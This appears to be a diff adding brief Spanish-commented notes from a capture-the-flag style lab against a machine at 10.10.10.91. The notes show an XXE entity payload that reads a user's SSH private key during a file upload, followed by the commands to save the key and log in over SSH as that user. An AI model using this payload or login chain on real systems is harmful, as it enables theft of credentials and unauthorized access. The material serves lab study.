@@ -1,0 +1,20 @@
+
+    #! subiendo archivo a una web
+  goo: XXE example
+
+.xml::: <!ENTITY xxe SYSTEM "file:///home/roosa/.ssh/id_rsa">]>
+
+
+::: touch id_rsa   
+  id_rsa{
+              ---BEGIN RSA PRIVATE KEY---
+                etc etc etc etc etc.....
+              ---END RSA PRIVATE KEY---
+  }
+
+::: chmod 600 id_rsa   #! la propia clave pide este tipo de permiso o dar[a error  
+
+::: ssh -i id_rsa  roosa@10.10.10.91
+  : yes <enter>
+
+::: whoami      #!   :)
